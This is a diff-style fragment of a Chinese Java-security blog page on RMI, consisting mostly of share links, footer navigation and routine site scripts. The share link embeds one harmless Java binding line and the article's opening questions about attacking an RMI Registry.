+&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Naming.bind(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;RemoteHelloWorld&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;第一篇大致讲了RMI整体的原理和流程，那么接下来自然要想到RMI会有哪些安全问题，可以分为两个方向&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;如果我们能够访问&lt;code&gt;RMI Registry&lt;/code&gt;，将如何对其进行攻击？&lt;/li&gt;
+&lt;li&gt;如果我们可以控制目标RMI客户端中的&lt;code&gt;Naming.lookup&lt;/code&gt;的第一个参数，也就是&lt;code&gt;RMI Registry&lt;/code&gt;的地址和端口，能不能进行攻击？&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&t=Java安全[RMI(2)]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    Ttoc
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  
+
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
